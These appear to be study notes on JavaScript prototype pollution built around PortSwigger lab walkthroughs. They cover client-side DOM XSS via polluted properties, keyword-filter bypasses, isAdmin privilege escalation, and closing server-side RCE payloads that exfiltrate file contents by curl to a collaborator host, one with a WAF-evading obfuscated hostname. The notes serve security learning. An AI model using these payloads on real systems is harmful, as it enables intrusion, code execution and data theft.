![[Prototype Pollution.webp]]
# Prototype Pollution

Prototype pollution is a JavaScript vulnerability enabling an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects. IT lets an attacker control properties of objects that would otherwise be inaccessible.

If an app handles an attacker-controlled property in an unsafe way, it can potentially be chained with other vulnerabilities. In client-side JavaScript, this can lead to DOM XSS, while server-side prototype pollution can even result in remote code execution.

An object is a collection of key:value pairs known as properties such as:

```javascript
const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```

The properties can be accessed using dot notation or bracket notation:

```js
user.username     // "wiener"
user['userId']    // 01234
```

Properties can also contain executable functions:

```js
const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}
```

Above is an `object literal` - meaning it was created using curly brace syntax to explicitly declare its properties and their initial values. Almost everything in JavaScript is an object. 

Every object is linked to another object of some kind, known as its `prototype`. By default, JavaScript automatically assigns new objects one of its built-in prototypes. Strings are automatically assigned the built in `String.prototype`. Some examples include:

```js
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);	    // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```

Objects inherit all properties of their assigned prototype, unless they have their own property with the same key. Built-in prototypes provide useful properties and methods for basic data types. The `String.prototype` object has a `toLowerCase()` method. As a result, all strings automatically have a ready-to-use method for converting to lowercase.

Prototype polluion arises when a JavaScript function recursively merges an object containing user-controllable properties into an existing object with no sanitization allowing an attacker to inject a property with a key like `__proto__` along with arbitrary nested properties.

The merge may assign the nested properties to the object's prototype instead of the object itself. If so, an attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the app in a dangerous way.

>[!info]
>It is possible to pollute any prototype object, but it most commonly occurs with the built-in global `Object.prototype`.

To successful pollute a prototype, you need key components:

1. A prototype pollution source - any input that enables you to poison prototype objects with arbitrary properties.
2. A sink - a JavaScript function or DOM element that enables arbitrary code execution.
3. An exploitable gadget - any property passed into a sink without filtering or sanitization.
# Object Inheritance

When referencing a property, the JavaScript engine tries to access it directly on the object itself. If no object matches, the engine looks for it on the prototype instead. For example, you can reference `myObject.propertyA`:

![[existingObject.png]]
# Prototype Chain

An object prototype is another object, which should also have its own prototype and so on. The chain ultimately leads back to the top-level `Object.prototype`, whose prototype is `null`.

![[String Prototype.png]]

Objects inherit properties not just from immediate prototypes, but from all objects above them in the chain meaning username object has access to properties and methods of both `String.prototype` and `Object.prototype`.
# Accessing Object Prototypes

Every object has a property to access its prototype - `__proto__` is the de facto standard used by most browsers. If you are familiar with object-oriented languages, the property serves as a getter and setter for the object's prototype, meaning you can use it to read the prototype and its properties and even reassign them.

You can access `__proto__` using bracket or dot notation:

```js
username.__proto__
username['__proto__']
```

You can even chain references to `__proto__` to work up the chain:

```js
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

It is possible to modify JavaScript built-in prototypes. Modern JavaScript provides the `trim()` method for strings, which enables you to easily remove any leading or trailing whitespace. Before it was added, devs sometimes add custom implementations to the `String.prototype` object via:

```js
String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}
```

All strings have access to this method:

```js
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```
# Prototype Pollution Sources

A source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources include:

- URL via either the query or fragment string
- JSON-based input
- Web messages

For example, a URL can contain an attacker constructed query string:

```http
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

A URL parser may interpret `__proto__` as an arbitrary string when breaking down the query string into key value pairs. If these keys and values are subsequently merged into an existing object, you may think the `__proto__` property along with the nested value of `evilProperty` are added to the target object:

```js
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```

At some point, the recursive merge operation may assign the value of `evilProperty` using a statement such as:

```js
targetObject.__proto__.evilProperty = 'payload';
```

The JavaScript engine treats `__proto__` as a getter for the prototype. As a result, `evilProperty` is assigned to the returned prototype object rather than the target object itself. Assuming the target object uses the default `Object.prototype`, all objects in JavaScript runtime will inherit `evilProperty`, unless a matching key already exists.

Injecting a property like this is unlikely to have an effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the app or any imported libraries.

User-controllable objects are also often derived from JSON strings using `JSON.parse()` method which also treats any key in the JSON object as an arbitrary string including things like `__proto__`. For example, an attacker can inject malicious JSON:

```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

If converted into JavaScript via `JSON.parse()`, the resulting object will have a property with the key `__proto__`:

```js
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

If the object created via `JSON.parse()` is merged into an existing object without proper key sanitization, it can lead to prototype pollution during the assignment.
# Prototype Pollution Sinks

A sink is just a JavaScript function or DOM element that you can access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands.

Since prototype pollution lets you control properties that are otherwise inaccessible, it potentially enables you to reach a number of additional sinks within the target app. Devs who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable meaning there may only be minimal filtering or sanitization in place.
# Prototype Pollution Gadgets

A gadget provides a means of turning the pollution vulnerability into an exploit. It is any property that:

- Used by the app in an unsafe way, such as passing it to a sink without filtering
- Attacker-controllable via prototype pollution. The object must be able to inherit a malicious version of the property added to the prototype by an attacker.

>[!info]
>A property cannot be a gadget if it is defined directly on the object. In that case, the object's own version takes precedence over any malicious version. Robust sites may also set the prototype of the object to `null`, which ensures that it does not inherit any properties at all.

Many JavaScript libraries accept an object that devs can use to set different config options. The library checks whether the dev has added certain properties to the object and if so adjusts the config. If a property that represents a particular option is not present, a predefined default option is often used instead. 

A simple example:

```js
let transport_url = config.transport_url || defaults.transport_url;
```

The library code uses this `transport_url` to add a script reference to the page:

```js
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

IF the devs have not a transport_url property on the config object, it is a potential gadget. In cases where you can pollute the global `Object.prototype` with `transport_url` property, it will be inherited by the `config` object and therefore set as the `src` for this script to a different domain.

If the prototype can be polluted via a query, an attacker would simply induce a victim to visit a crafted URL to cause their browser to import a malicious JavaScript file from an attacker domain:

```html
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

By providing a `data:` URL, an attacker can directly embed XSS payloads within the query string:

```html
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

>[!info]
>Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix.
# Recon

Finding pollution sources is trial and error. Try different ways of adding an arbitrary property to `Object.prototype` until you find a source that works. When testing for client-side vulnerabilities, it involves steps like:

1. Try injecting an arbitrary property via the query string, URL fragment, and any JSON input such as:

```js
vulnerable-website.com/?__proto__[foo]=bar
```

1. In a browser console, inspect `Object.prototype` to see if it successfully polluted with an arbitrary property

```js
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```

If not added, try different techniques such as dot notation:

```js
vulnerable-website.com/?__proto__.foo=bar
```

DOM Invader can also be used to automatically test for prototype pollution sources by browsing.

Once a source is identified that lets you add arbitrary properties to the global `Object.prototype`, the next step is finding a gadget to craft an exploit. To do it manually:

1. Look at the source code and find any properties that are used by the app or any libraries that it imports.
2. In Burp, enable response interception and intercept the response containing the JavaScript to test.
3. Add a `debugger` statement at the start of the script, then forward any remaining requests and responses.
4. In Burp's browser, go to the page on which the target script is loaded. The `debugger` statement pauses execution of the script.
5. While script is paused, enter the following in the console replacing the property with one you think is a potential gadget

```js
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

The property is added to the global `Object.prototype` and the browser logs a stack trace to the console whenever access.

1. Continue execution and monitor the console. If a stack trace appears, it confirms the property was accessed somewhere within the app.
2. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.
3. Using debugger controls, step through each phase of the execution to see if the property is passed to a sink, such as `innerHTML()` or `eval()`.
4. Repeat for any properties that are potential gadgets.

>[!info]
>DOM Invader can automatically scan for gadgets and can generate DOM XSS PoC in some cases.
# Cheat Sheet

As a quick reference for prototype pollution via the URL:

```bash
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

Or for prototype pollution via JSON input:

```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

```json
"constructor": {
    "prototype": {
        "evilProperty": "payload"
    }
}
```
# DOM XSS via Client-Side Prototype Pollution

For example, try defining an object in the console to first understand what prototype pollution is:

```js
let myObject = {name: 'example', id: 1}
```

To grab the name value, it can be done two ways:

```js
myObject.name
myObject['name']
```

![[myObject.png]]

The object has other properties besides the one declared as JavaScript automatically assigns new objects one of its built-in prototypes such as `String.prototype` or `Object.prototype`:

![[myObject Prototype.png]]

The object inherits all of the properties of the assigned prototype, except if it already contains a property with the same key. 

If you write `myObject.__proto__.isImportant = true` and call the object, the `isImportant` may be assigned to the prototype rather than the target object, meaning any object that uses the default `Object.prototype` will inherit the property unless one is already defined.

![[isimportant.png]]

>[!info]
>It happens because during assignment, JavaScript treats proto as a setter for the prototype.

Try polluting the object via the URL with an arbitrary property by a query string such as:

```js
?__proto__.evil=polluted
```

If polluted correctly, try calling the `Object.prototype` in the console and checking if it exists. If not, try the bracket notation instead:

```js
?__proto__.[evil]=polluted
```

![[EvilPolluted.png]]

If it exists in the prototype, it means the Object prototype is polluted, meaning a source has been found. Next, study every JS file and identify any properties used by the app via checking the `resources/js` folder in the Debugger tab for all JS files.

![[deparam.png]]

It converts URL parameters into a JavaScript object by replacing `+` with spaces, splits the query parameters into an array, iterates over each parameter and separate the key from the value, decodes the key and value using `decodeURIComponent`, handles nested parameters and the race syntax in the keys and more.

Another JS files may call the `deparam` function:

![[deparamcalled.png]]

To check what the code does, try running it on the console. IT creates a config object with a params property. The `params` property is an objected obtained by parsing the query parameters of the current URL and converts them into an object using the `deparam` function.

![[letparam.png]]

Try adding a variety of query parameters to the URL and check config again. The `evil` property is part of the object prototype properties. 

The `searchLogger` function uses a transport_url property of the config object to dynamically add a script inside the page. The config object has no transport URL property defined, meaning you can pollute the object prototype with the property. 

When the function checks if it exists, it creates a script element and passes the value of the property to the `src` attribute.

To exploit, pollute the prototype with a `transport_url` property equal to a random value:

```js
?__proto__[transport_url]=example
```

![[configurl.png]]

The config object has the transport_url which was inherited from the object prototype. The `script` was added to the DOM with the src attribute set to `example`. To call an alert, the data URL scheme can be used to include data directly in the URL:

```js
?__proto__[transport_url]=data:text/javascript,alert()
```

>[!info]
>When browsers encounter the script tag with a src attribute pointing to a data URL, it interprets the content as code rather than treating it as plain text.

Other payloads that work include ones without the MIME type specified:

```js
/?__proto__.transport_url=data:,alert(1);
/?__proto__[transport_url]=data:,alert(1);
```

To do it with DOM Invader, turn it on with prototype pollution enabled. It automatically checks the page for sources that enable you to add arbitrary properties to the object prototype. The results are stored in DevTools:

![[DOMInvader.png]]

It finds two potential sources for polluting the object. Hitting "Test", it opens a new tab and adds an arbitrary property to the object prototype:

```js
/?__proto__[testproperty]=DOM_INVADER_PP_POC
```

After running it, check if a new object inherits the test property by creating a new object:

```js
let myObject = {}
myObject
```

![[dominvaderpoc.png]]

To scan for gadgets, click "Scan for Gadgets" - it will open a new tab and perform tests, identifying the transport URL property:

![[transportURL.png]]

Check the stack trace to get sent to the JavaScript file where the sink was found. Try clicking the "Exploit" button to automatically generate a PoC exploit which may call an alert payload.

For other scenarios, the client-side code may have some extra protections that are flawed, such as removing key words but not doing it recursively. Some payloads to bypass this validation include:

```js
/?__pro__proto__to__[transport_url]=data:,alert(1);
/?__pro__proto__to__.transport_url=data:,alert(1);
/?constconstructorructor.[protoprototypetype][transport_url]=data:,alert(1);
/?constconstructorructor.protoprototypetype.transport_url=data:,alert(1);
```

Another scenario may be that the app is using the user input within an eval() function. To trigger an XSS vulnerability, it is required "break" out of the context (use hyphens):

```js
?__proto__.sequence=-alert(1)-
```
# DOM XSS via Alternative Prototype Pollution Vector

For example, the first place to look is the URL - try polluting the object prototype with an arbitrary property via a query string and check the object prototype:

```js
/?__proto__.evil=polluted
```

![[evilpolluted2.png]]

If it contains the property, a source has been found. Try studying the JavaScript files and identifying any properties used by the app. For example, there may be a file that defines a jQuery plugin (`parseParams`) that parses query parameters from URL and returns them as a JavaScript object or there may be a `searchLoggerAlternative` file such as:

![[evalisevil.png]]

The `eval()` function is being used to dynamically executed code based on the manager sequence value. Check if the property passed to the sink is an exploitable gadget. 

Two objects are being initialized on the window object:

- macros - an empty object
- manager - has two properties of `params` and `macro`
	- `params` stores the results of the URL query parameters using the `parseParams` function
	- `macro` method takes a property parameter and checks if the macros object contains a property with the given name. If so it returns the value of the property.

If `manager.sequence` does not exist, `a` takes the value of 1. The `manager.sequence` becomes `a + 1`. For example, try checking the properties of the manager object - it contains two properties:

![[macroparams.png]]

If no sequence property exists, it means `manager.sequence` should be 2 which it is.

The eval function checks if manager and manager.sequence exists. If they both do, it calls the `manager.macro()` method with the value of manager.sequence as an argument. Since sequence is not defined, try polluting the object prototype by adding a sequence parameter with a value of `alert`, meaning the macro method is called with an alert function as a parameter.

>[!info]
>Functions can take another function as a parameter. When macro is called, the alert function is called immediately which displays a popup box to the page.

Try submitting `manager.macro(alert())` in the Console and see if a popup appears. If so, pollute the object prototype:

```js
/?__proto__.sequence=alert()
```

Check if the manager object contains a property called sequence and check the value of `manager.sequence`:

![[alert1.png]]

The value is `alert()1` because of the code that adds a `1` after the value of `manager.sequence`.  When `manager.macro` of `manager.sequence` is called, it does not trigger an alert due to an error:

![[Error.png]]

If so, try adding a `-` at the end to make it valid. JavaScript expects a semicolon, comma or operator after the function call to be valid syntax.

>[!info]
>DOM Invader can also complete this lab much quicker.
# Prototype Pollution via Constructor

A common defence is stripping away any properties with the key `__proto__` from user-controlled objects but it is flawed since there are alternative ways to reference `Object.prototype` without it. 

Unless the prototype is set to null, every JS object has a `constructor` property which contains a reference to the constructor function that was used to create it. For example, create a new object using literal syntax or invoking the `ObjecT()` constructor:

```js
let myObjectLiteral = {};
let myObject = new Object();
```

Then, you can reference the `Object()` constructor via the built-in constructor property:

```js
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```

Each constructor function has a prototype property, which points to the prototype assigned to any objects that are created by the constructor. You can also access any object's prototype via:

```js
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

Since `myObject.constructor.prototype` is equivalent to `myObject.__proto__`, it is an alternative vector.
# Flawed Key Sanitization

A way sites prevent it is by sanitizing property keys before merging into an existing object. A common mistake is failing to recursively sanitize the input string. For example:

```js
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

If the sanitization process just strips `__proto__` without repeating, it would result in the following:

```js
vulnerable-website.com/?__proto__.gadget=payload
```
# Client Side Prototype Pollution via Flawed Sanitization

For example, try opening the console and defining a new object and then declaring and grabbing its properties:

```js
let myObj = {}
myOject.x = 'y'
myObject['a'] = 'b'
myObj
```

![[myobj.png]]

Besides declared properties, it also gets assigned a built in prototype (`object.prototype`). Objects automatically inherit all properties of their prototype, unless they already have their own property with the same key.

As an example, try calling `hasOwnProperty` method such as:

```js
myObject.hasOwnPropert('x')
```

![[propx.png]]

It returns true as the x property is attributed to the object. 

There are many ways to pollute the object prototype. For example, try using the `__proto__` property such as:

```js
myObj.__proto__.first = 'first'
myObj['__proto__']['second'] = 'second'
```

Another way is via the constructor:

```js
myObj.constructor.prototype.third = 'third'
myObj['constructor']['prototype']['fourth'] = 'fourth'
```

Checking the prototype properties may show it contains the new properties declared:

![[1234.png]]

All new objects will inherit these properties - check by declaring a new object:

```js
let newObj = {}
newObj
```

![[newobj.png]]

To exploit it, analyse the JavaScript files. For example, there may be a `searchLogger` function that initializes a new object `config` with a property `params`. The value of `params` is obtained by serializing the search parameters of the current URL and passing them through the `deparam` function:

![[deparam2.png]]

The function may be in another file. For example, it may parse the URL query parameters into a JavaScript object, split the params string into an array of key value pairs at the `&` character. It then splits the current key value pairs at the = sign.

It also handles complexities in the key names, coerces values to their appropriate types and sanitizes the key via `sanitizeKey` function:

![[KeySanitize.png]]

Try adding query string parameters to the URL such as:

```js
/?a=b&c=d
```

And execute the JavaScript line in the console that defines the object:

```js
let config = {params: deparam(new URL(location).searchParams.toString())};
```

![[params.png]]

The query parameters are added to the params property successfully. There is also an `if` statement - if `config` has a property named `transport_url`, the script dynamically creates a script element and sets the `src` attribute to the value of the `transport_url` property. It then appends it to the body of the HTML document.

![[letscript.png]]

Since config does not have a transport_url property by default, try polluting the object prototype with the property and provide a value that causes an alert by adding a query parameter:

```js
/?a=b&c=d&__proto__.transport_url=testing
```

The property name may be stripped:

![[stripped.png]]

Check the JS files for any indication of stripping. For example, it may replace the words like constructor, proto and prototype with empty strings:

![[sanitization.png]]

If it does not do it recursively, nesting the word inside itself may bypass the restriction. For example:

```js
/?a=b&c=d&__pro__proto__to__.transport_url=testing
```

If it does not work, try other versions such as:

```js
/?a=b&c=d&__pro__proto__to__[transport_url]=testing
```

If bypassed, the script will be added to the page and the payload can be modified to execute an alert box. To find payloads, try look at the XSS cheat sheet to search for `script src`:

```js
/?a=b&c=d&__pro__proto__to__[transport_url]=data:text/javascript,alert()
```
# Prototype Pollution in External Libraries

Prototype pollution gadgets may occur in third-party libraries imported in. If so, it is recommended to use DOM Invader to identify sources and gadgets. It will be much quicker and ensure you won't miss vulnerabilities that may be tricky to notice.

DOM Invader checks the page for sources that allow you to add arbitrary properties to built-in prototypes. For example, it may identify potential techniques. If so, try testing the payload and check if it works via the Console:

![[DOM Invader PP PoC.png]]

Try creating a new object and checking if it inherits the test property:

```js
let myObject = {}
myObject.testproperty
```

![[Test Property.png]]

If it all works, try scanning for gadgets and check for any identified sinks and try checking the stack trace and the JavaScript file. Try exploiting it automatically and check it works. If so, try delivering it to the victim such as:

```html
<script>
location = "https://0a3700fa035c3df1818ac503001d0083.web-security-academy.net/#__proto__[hitCallback]=alert%281%29";
</script>
```

For manual methods, try adding properties via the URL by using a query string or a hash string:

```js
#__proto__.foo=bar
```

And try querying the object prototype:

```js
Object.prototype
```

If no success, try different syntax:

```js
#__proto__[foo]=bar
```

![[Source Identified.png]]

If successful, try finding a gadget - any property that is passed into a sink without proper sanitization by looking at the JavaScript files the app uses. Look through the files one by one. For example, there may be a function that is used to add properties to the "Ua" object:

![[Function VA.png]]

There may be various properties like anonymizeIp, currencyCode, title, etc... Try testing the properties one by one and check if they are passed to a sink such as eval() by intercepting responses in Burp, refreshing the page and intercepting the response loading the JavaScript file.

Try adding a debugger statement such as:

```html
<script>
debugger;
</script>
```

![[Script Debugger.png]]

This pauses execution. Try executing the following code in the console that defines a getter for the property on the Object.prototype. When the script tries to access the property on any object, the getter function is executed which logs a trace to the console and returns a string:

```js
Object.defineProperty(Object.prototype, 'hitCallback', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

If no stack trace appears, it means it was never accessed. Repeat the test for every property until the console returns an error. Check the stack trace and analyse the JavaScript lines such as:

![[Var Vc.png]]

The `tc` is set to `hitCallback`. The `a.get(tc)` now returns polluted meaning the setTimeout is being called with polluted as the first argument instead of a function. To fix it, change the getter to return a function instead of a string:

```js
Object.defineProperty(Object.prototype, 'hitCallback', {
    get() {
        console.trace();
        return alert();
    }
})
```
# Prototype Pollution in Browser APIs

The `Fetch` API provides a simple way for devs to trigger HTTP requests using JavaScript. The `fetch()` method accepts two arguments - URL to send the request to and an options object to control parts of the request like method, headers, body parameters.

An example is:

```js
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
```

The method and body properties are defined, with more left undefined. If an attacker can find a suitable source, they can pollute Object.prototype with a malicious headers property which may be inherited by the options object passed into `fetch()` and subsequently used to generate the request.

As an example, the code may be vulnerable to DOM XSS:

```js
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```

To exploit it, they could pollute Object.prototype with a header property containing a malicious `x-username` header as follows:

```js
`?__proto__[headers][x-username]=<img/src/onerror=alert(1)>`
```

The header may be used to set the value of the `x-username` property in the returned JSON. In the client-side code above, it is then assigned to the `username` variable, later passed into the `innerHTML` sink resulting in DOM XSS.

Devs may attempt to block potential gadgets using `Object.defineProperty()` method which allows you to set a non-configurable, non-writeable property directly on the affected object:

```js
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```

The `Object.defineProperty()` method accepts an options object known as a descriptor. Devs can use the descriptor object to set an initial value for the property being defined. If the only reason they are defining the property is to protect against prototype pollution, they may not set a value at all.

If so, an attacker can bypass it by polluting `Object.prototype` with a malicious `value` property. If inherited by the descriptor objected passed to `Object.defineProperty`, the attacker value is assigned to the gadget property.

For a full example, try polluting using a URL query parameter:

```js
/?__proto__.foo=bar
```

And query the object prototype:

```js
Object.prototype
```

If no success, try different syntax:

```js
/?__proto__[foo]=bar
```

![[FooBar2.png]]

If found, identify every property used by the app by analysing JavaScript files. There may be a transport URL or other property with a defined value of "false".

![[Transport URL False.png]]

If the object prototype is polluted with a transport_url property, the config object will not inherit it as it already has its own property with the same name:

![[Config False.png]]

The `object.DefineProperty` method may be in use that makes the transport_url property on the config object unwriteable and unconfigurable. It defines a new property on an object or modifies an existing property.

It takes three parameters:

1. Object on which to define the property
2. Property to be defined or modified
3. Descriptor object for the property

A `data` descriptor has an optional key name `value`. If defined, the value of the defined property will be changed to the new value. For example, a property may be defined as false - try adding the value property to the descriptor object and set it to true:

```js
let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
Object.defineProperty(config, 'transport_url', {value: true, configurable: false, writable: false});
```

![[Let Config.png]]

It changes to true meaning you can pollute the object prototype with a value property and override the value of `transport_url`. When `object.property` is called, the `descriptor` object, not having a value property defined, inherits the value property from the object prototype, overwriting the value of `transport_url`.

![[Transport URL.png]]

Try injecting an arbitrary value:

```js
/?__proto__[value]=polluted
```

If `config` has a property named transport_url, a script element is created and its source attribute is set to the value of the `transport_url` property - i.e. polluted - and appended to the body of the HTML document. Try injecting a payload inside script src such as:

```js
/?__proto__[value]=data:text/javascript,alert()
```
# Server-Side Prototype Pollution


















# Server-Side Prototype Pollution - Priv Esc

Identify functionality on the application where JSON data is returned in a response that appears to represent your "User" Object. An example response:

```json
{
"username":"test",
"firstname":"test",
"isAdmin":false
}
```

Then, identify a prototype pollution source. In the request body, add a new property to the JSON with the name __proto__, containing an object with an arbitrary property. An example payload:

```json
"__proto__": {
	"foo":"bar"
}
```

If in the response you see the "foo" property added, without the "__proto__" property, this suggests that we may have polluted the Object's prototype and that the "foo" property has been inherited via prototype chain.

Identify a gadget. The "isAdmin" property would be something to target for privilege escalation. And then craft a payload with an example being:

```json
"__proto__": {
    "isAdmin":true
}
```

In the response, if you see the following it suggests that the "User" object did not have its own "isAdmin“ property, and instead inherited from the polluted prototype. An example response:

```json
{
"username":"test",
"firstname":"test",
"isAdmin":true
}
```

The application may be performing some filtering on the input, one way to bypass it is by using the constructor:

```json
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```
# Detecting Prototype Pollution without Polluted Property Reflection

There are 3 main techniques:

- Status code override
- JSON spaces override
- Charset override

>[!info]
>https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection

First, identify prototype pollution source via the JSON spaces technique:

```json
"__proto__":{
	"json spaces":10
}
```

If the prototype pollution payload was successful, you can see a notable difference in the response, while not breaking the application's functionality. Burp Suite has an extension that can help to identify server-side prototype pollution: https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8
# Server-Side Prototype Pollution - RCE and Exfiltration

For payloads - inject these into JSON body of HTTP requests:

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```

Vim has an interactive prompt and expects the user to hit Enter to run the provided command. As a result, you need to simulate this by including a newline (\n) character at the end of your payload, as shown in the examples.

```json
"shell":"vim",
"input":":! <command>\n"
```

```json
"__proto__": {
    "shell":"vim",
    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

To exfiltrate data to Burp Collaborator:

```json
"__proto__": {
    "shell":"vim",
    "input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

```json
"__proto__": {
    "shell":"vim",
    "input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames.

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

